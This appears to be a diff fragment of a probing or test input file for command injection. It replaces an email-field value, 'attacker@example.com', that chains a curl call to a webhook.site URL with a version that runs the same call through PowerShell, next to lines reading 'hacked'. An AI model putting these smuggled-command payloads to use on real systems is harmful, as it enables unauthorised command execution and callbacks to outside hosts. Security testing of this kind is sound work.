@@ -6,4 +6,6 @@ hacked
 hacked2 
 hacked 
 hacked 
-attacker@example.com & curl https://webhook.site/8bab6bcd-4a1b-4735-a2e1-5139468d7126 & echo hacked
+attacker@example.com & C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe curl https://webhook.site/8bab6bcd-4a1b-4735-a2e1-5139468d7126 & echo hacked
+hacked 
+hacked 
